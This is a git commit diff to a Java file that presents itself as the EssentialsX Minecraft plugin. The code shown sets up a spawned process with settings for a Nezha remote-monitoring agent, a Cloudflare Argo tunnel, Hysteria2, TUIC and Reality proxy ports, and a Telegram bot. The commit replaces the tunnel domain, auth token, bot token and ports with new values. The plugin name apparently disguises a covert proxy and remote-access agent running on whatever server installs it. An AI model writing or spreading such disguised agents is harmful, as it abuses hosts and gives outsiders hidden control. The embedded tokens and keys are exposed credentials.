55da832f8d04afc26cb8e844b98739f913950a3e
ochelp <108503967+ochelp@users.noreply.github.com>
2026-05-09 19:37:16 +0800

    Update environment variables in EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -73,23 +73,23 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "47e135d1-0106-4bb1-907a-858c3a5c9314");
+        env.put("UUID", "3aa76bf6-a5ea-4646-96ab-70639804ba6f");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "agent.hhcctest03.cc.cd:80");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "wGF3Olr02hGCk2OyD2xSEkjsAoaRQK31");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "crosmo.xxaal.ccwu.cc");
-        env.put("ARGO_AUTH", "eyJhIjoiOTk4YzJmYjJlNDEzYTVhZmExYzJlNGMyOGU3YTU5OTMiLCJ0IjoiMWRkZTQ0OTMtYWZiNy00YzVhLTg1NTAtNzk1NDA3NGRhZTIyIiwicyI6Ik5HWTFPRFl5TkdRdE1HRXhZeTAwWW1Zd0xUa3pPR010TVdVNU9ESXlPVE15TkdFMCJ9");
+        env.put("ARGO_DOMAIN", "byte.noonehc.dpdns.org");
+        env.put("ARGO_AUTH", "eyJhIjoiOTk4YzJmYjJlNDEzYTVhZmExYzJlNGMyOGU3YTU5OTMiLCJ0IjoiZjllZDkyOTYtZThkMy00YjFmLTg3MDctMjBhOTBkOGNkNmZkIiwicyI6Ik1XRm1OMkZtTVdNdFlUVXlNUzAwTnpZd0xUbGpZMlV0T1Rjd05EVTVaRGRrTWpNMiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "3140");
-        env.put("TUIC_PORT", "3141");
+        env.put("HY2_PORT", "3860");
+        env.put("TUIC_PORT", "3861");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "3142");
+        env.put("REALITY_PORT", "3860");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "8680922177");
-        env.put("BOT_TOKEN", "8604163776:AAFs-bnDOwn5QlOL-JxGZRZmzYHEG7fa044");
+        env.put("BOT_TOKEN", "8715862600:AAGbKyUqzWwFoD0FRuK32QULsfSwKwuQj2Y");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
